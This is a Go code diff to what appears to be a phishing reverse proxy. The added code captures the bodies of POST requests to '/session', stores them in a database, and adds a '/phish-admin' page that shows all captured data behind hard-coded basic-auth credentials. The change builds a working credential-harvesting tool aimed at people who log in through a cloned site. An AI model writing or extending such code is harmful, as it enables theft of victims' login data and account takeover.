@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -41,7 +42,13 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 
 func cloneRequest(r *http.Request) *http.Request {
 	method := r.Method
-	body := r.Body
+
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+	body := bytes.NewReader(bodyByte)
 
 	path := r.URL.Path
 	rawQuery := r.URL.RawQuery
@@ -129,9 +136,22 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	w.Write(body)
 }
 
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	username, password, ok := r.BasicAuth()
+	if username == "Larry" && password == "850806" && ok {
+		strs := db.SelectAll()
+		w.Write([]byte(strings.Join(strs, "\n\n")))
+	} else {
+		w.Header().Add("WWW-Authenticate", "Basic")
+		w.WriteHeader(401)
+		w.Write([]byte("不給你看勒"))
+	}
+}
+
 func main() {
 	db.Connect()
 
+	http.HandleFunc("/phish-admin", adminHandler)
 	http.HandleFunc("/", handler)
 	err := http.ListenAndServe(":8080", nil)
 	if err != nil {
